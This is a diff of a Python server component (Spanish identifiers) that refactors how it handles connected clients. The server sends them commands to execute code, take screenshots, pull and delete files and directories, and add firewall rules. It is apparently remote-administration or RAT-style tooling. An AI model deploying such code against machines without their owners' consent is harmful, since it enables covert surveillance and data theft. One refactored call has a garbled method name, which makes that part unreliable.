@@ -1,13 +1,15 @@
 import json
 import os
 import base64
-import tempfile
 import zipfile
 import io
 from utils.logger import get_console
-from config.settings import RECEIVED_FILES_DIR, DIRECTORIES_DIR, SCREENSHOTS_DIR
+from config.settings import RECEIVED_FILES_DIR
 from utils.response_waiter import ResponseWaiter
-from datetime import datetime
+
+from server.handlers.screenshot_handler import ScreenshotHandler
+from server.handlers.directory_handler import DirectoryHandler
+from server.handlers.file_handler import FileHandler
 
 class ClientManager:
     """Administra clientes conectados y procesa sus respuestas."""
@@ -18,6 +20,10 @@ class ClientManager:
         self.console = get_console()
         self._cmd = cmd 
         self.response_waiter = ResponseWaiter(timeout=5)
+        
+        self.directory_handler = DirectoryHandler(self)
+        self.screenshot_handler = ScreenshotHandler(self)
+        self.file_handler = FileHandler(self)
         
     def esperar_respuesta_accion(self, accion, cliente_id=None):
         """Espera la(s) respuesta(s) de uno o varios clientes para una acción dada."""
@@ -53,7 +59,7 @@ class ClientManager:
                 self.console.print(f"\n{cliente_id} [bold green]Archivo guardado:[/bold green] {datos_dict.get('ruta_destino')}")
                 
             elif accion == "archivo_enviado":
-                self._procesar_archivo_enviado(datos_dict, cliente_id)
+                self.file_handler._procesar_archivo_enviado(datos_dict, cliente_id)
                 
             elif accion == "error":
                 self.console.print(f"\n{cliente_id} [bold red]Error:[/bold red] {datos_dict.get('mensaje')}")
@@ -64,14 +70,15 @@ class ClientManager:
                 self.response_waiter.notificar_respuesta(cliente['id'], accion)
                 
             elif accion == "directorio_enviado":
-                self._procesar_directorio_enviado(datos_dict, cliente_id)
+                self.directory_handler._procesar_directorio_enviado(datos_dict, cliente_id)
+                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                 
             elif accion == "eliminacion_exitosa":
-                self._procesar_eliminacion_exitosa(datos_dict, cliente_id)
+                self.directory_handler._procesar_eliminacion_exitosa(datos_dict, cliente_id)
                 self.response_waiter.notificar_respuesta(cliente['id'], accion)
                 
             elif accion == "captura_enviada":
-                self._procesar_captura_enviada(datos_dict, cliente_id)
+                self.screenshot_handler._procesar_captura_enviadarocesar_captura_enviada(datos_dict, cliente_id)
                 self.response_waiter.notificar_respuesta(cliente['id'], accion)
                 
             elif accion == "regla_firewall_agregada":
@@ -84,89 +91,6 @@ class ClientManager:
             self.console.print(f"[bold red][!] Error al decodificar respuesta del cliente: {datos}[/bold red]")
         except Exception as e:
             self.console.print(f"[bold red][!] Error al procesar respuesta del cliente: {e}[/bold red]")
-    
-    def _procesar_archivo_enviado(self, datos_dict, cliente_id):
-        """Procesa un archivo enviado por el cliente."""
-        nombre_archivo = datos_dict.get("nombre_archivo")
-        ruta_destino = datos_dict.get("ruta_destino", os.path.join(RECEIVED_FILES_DIR, nombre_archivo))
-        datos_archivo = datos_dict.get("datos_archivo")
-        
-        directorio = os.path.dirname(ruta_destino)
-        os.makedirs(directorio, exist_ok=True)
-        
-        with open(ruta_destino, "wb") as f:
-            f.write(base64.b64decode(datos_archivo))
-        
-        self.console.print(f"\n{cliente_id} [bold green]Archivo recibido y guardado en:[/bold green] {ruta_destino}")
-    
-    def _procesar_directorio_enviado(self, datos_dict, cliente_id):
-        """Procesa un directorio enviado como ZIP."""
-        nombre_directorio = datos_dict.get("nombre_directorio")
-        ruta_destino = datos_dict.get("ruta_destino", DIRECTORIES_DIR)
-        datos_zip = datos_dict.get("datos_zip")
-        ruta_origen = datos_dict.get("ruta_origen")
-        
-        try:
-            ruta_destino_completa = os.path.join(ruta_destino, nombre_directorio)
-            os.makedirs(ruta_destino_completa, exist_ok=True)
-            
-            with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as temp_zip:
-                temp_zip_path = temp_zip.name
-                temp_zip.write(base64.b64decode(datos_zip))
-            
-            with zipfile.ZipFile(temp_zip_path, 'r') as zipf:
-                zipf.extractall(ruta_destino_completa)
-            
-            os.unlink(temp_zip_path)
-            
-            self.console.print(f"\n{cliente_id} [bold green]Directorio recibido y extraído en:[/bold green] {ruta_destino_completa}")
-            self.console.print(f"{cliente_id} Directorio origen: {ruta_origen}")
-        except Exception as e:
-            self.console.print(f"\n{cliente_id} [bold red]Error al procesar directorio:[/bold red] {str(e)}")
-    
-    def _procesar_eliminacion_exitosa(self, datos_dict, cliente_id):
-        """Procesa una eliminación exitosa."""
-        tipo_elemento = datos_dict.get("tipo", "elemento")
-        ruta_eliminada = datos_dict.get("ruta")
-        mensaje = datos_dict.get("mensaje")
-        
-        self.console.print(f"\n{cliente_id} [bold green]✅ Eliminación exitosa:[/bold green]")
-        self.console.print(f"{cliente_id} Tipo: {tipo_elemento.capitalize()}")
-        self.console.print(f"{cliente_id} Ruta: {ruta_eliminada}")
-        self.console.print(f"{cliente_id} {mensaje}")
-    
-    def _procesar_captura_enviada(self, datos_dict, cliente_id):
-        """Procesa una captura de pantalla enviada."""
-        nombre_archivo = datos_dict.get("nombre_archivo")
-        
-        timestamp = datetime.now().strftime("__%d_%m_%Y__%H_%M_%S")
-        
-        ip_cliente = cliente_id.split("(")[-1].replace(")", "").replace("]", "").replace(".", "-")
-
-        nombre_base, extension = os.path.splitext(nombre_archivo)
-        
-        nuevo_nombre = f"{nombre_base}{timestamp}__{ip_cliente}{extension}"
-        
-        ruta_carpeta = datos_dict.get("ruta_destino", SCREENSHOTS_DIR)
-        ruta_destino = os.path.join(ruta_carpeta, nuevo_nombre)
-
-        datos_imagen = datos_dict.get("datos_imagen")
-        ancho = datos_dict.get("ancho", 0)
-        alto = datos_dict.get("alto", 0)
-        
-        try:
-            directorio = os.path.dirname(ruta_destino)
-            os.makedirs(directorio, exist_ok=True)
-            
-            with open(ruta_destino, "wb") as f:
-                f.write(base64.b64decode(datos_imagen))
-            
-            self.console.print(f"\n{cliente_id} [bold green]📸 Captura de pantalla guardada:[/bold green]")
-            self.console.print(f"{cliente_id} Archivo: {ruta_destino}")
-            self.console.print(f"{cliente_id} Resolución: {ancho}x{alto} píxeles")
-            self.console.print(f"{cliente_id} Tamaño: {os.path.getsize(ruta_destino)} bytes")
-        except Exception as e:
-            self.console.print(f"\n{cliente_id} [bold red]Error al guardar captura de pantalla:[/bold red] {str(e)}")
     
     def _procesar_regla_firewall_agregada(self, datos_dict, cliente_id):
         """Procesa una regla de firewall agregada."""
@@ -212,19 +136,8 @@ class ClientManager:
     
     def enviar_comando_listar_directorio(self, ruta, incluir_archivos=False, cliente_id=None):
         """Envía comando para listar un directorio."""
-        mensaje = {
-            "accion": "listar_directorio",
-            "ruta": ruta,
-            "incluir_archivos": incluir_archivos
-        }
-        if cliente_id is None:
-            self.servidor.enviar_comando_todos(mensaje)
-        else:
-            self.servidor.enviar_comando_cliente(cliente_id, mensaje)
-            
-        if not self.esperar_respuesta_accion("respuesta_listado", cliente_id):
-            return "[bold red][!] Tiempo de espera agotado. El cliente no respondió.[/bold red]"
-        return None
+        exito_envio = self.directory_handler.enviar_comando_listar_directorio(ruta, incluir_archivos, cliente_id)
+        return self.comprobar_respuesta(exito_envio, "respuesta_listado", cliente_id)
     
     def obtener_info_clientes(self):
         """Obtiene información de los clientes conectados."""
@@ -236,40 +149,22 @@ class ClientManager:
 
     def enviar_comando_solicitar_directorio(self, ruta_origen, ruta_destino, cliente_id=None):
         """Envía comando para solicitar un directorio desde los clientes."""
-        from server.handlers.directory_handler import DirectoryHandler
-        handler = DirectoryHandler(self)
-        return handler.enviar_comando_solicitar_directorio(ruta_origen, ruta_destino, cliente_id)
+        exito_envio = self.directory_handler.enviar_comando_solicitar_directorio(ruta_origen, ruta_destino, cliente_id)
+        
+        return self.comprobar_respuesta(exito_envio, "directorio_enviado", cliente_id)
 
     def enviar_comando_capturar_pantalla(self, ruta_destino, nombre_archivo=None, cliente_id=None):
         """Envía comando para capturar pantalla y espera respuesta."""
-        from server.handlers.screenshot_handler import ScreenshotHandler
-        handler = ScreenshotHandler(self)
         
-        exito_envio = handler.enviar_comando_capturar_pantalla(ruta_destino, nombre_archivo, cliente_id)
-        if not exito_envio:
-            return False
-
-        accion_esperada = "captura_enviada"
-        if not self.esperar_respuesta_accion(accion_esperada, cliente_id):
-            self.console.print("[bold red][!] Tiempo de espera agotado. El cliente no respondió.[/bold red]")
-            return False
-
-        return True
+        exito_envio = self.screenshot_handler.enviar_comando_capturar_pantalla(ruta_destino, nombre_archivo, cliente_id)
+        
+        return self.comprobar_respuesta(exito_envio, "captura_enviada", cliente_id)
     
     def enviar_comando_eliminar(self, ruta, cliente_id=None):
         """Envía comando para eliminar un archivo o directorio en los clientes."""
-        mensaje = {
-            "accion": "eliminar",
-            "ruta": ruta
-        }
-        if cliente_id is None:
-            self.servidor.enviar_comando_todos(mensaje)
-        else:
-            self.servidor.enviar_comando_cliente(cliente_id, mensaje)
-            
-        if not self.esperar_respuesta_accion("eliminacion_exitosa", cliente_id):
-            return "[bold red][!] Tiempo de espera agotado. El cliente no respondió.[/bold red]"
-        return None
+        exito_envio = self.directory_handler.enviar_comando_eliminar(ruta, cliente_id)
+        
+        return self.comprobar_respuesta(exito_envio, "eliminacion_exitosa", cliente_id)
         
     def enviar_comando_ejecutar(self, codigo, cliente_id=None):
         """Envía comando para ejecutar un código en los clientes."""
@@ -277,12 +172,15 @@ class ClientManager:
         handler = CommandHandler(self)
         
         exito_envio = handler.enviar_comando_ejecutar(codigo, cliente_id)
+        
+        return self.comprobar_respuesta(exito_envio, "respuesta_ejecucion", cliente_id)
+    
+    def comprobar_respuesta(self, exito_envio, accion_esperada, cliente_id=None):
         if not exito_envio:
             return False
         
-        accion_esperada = "respuesta_ejecucion"
         if not self.esperar_respuesta_accion(accion_esperada, cliente_id):
             self.console.print("[bold red][!] Tiempo de espera agotado. El cliente no respondió.[/bold red]")
             return False
-
+        
         return True
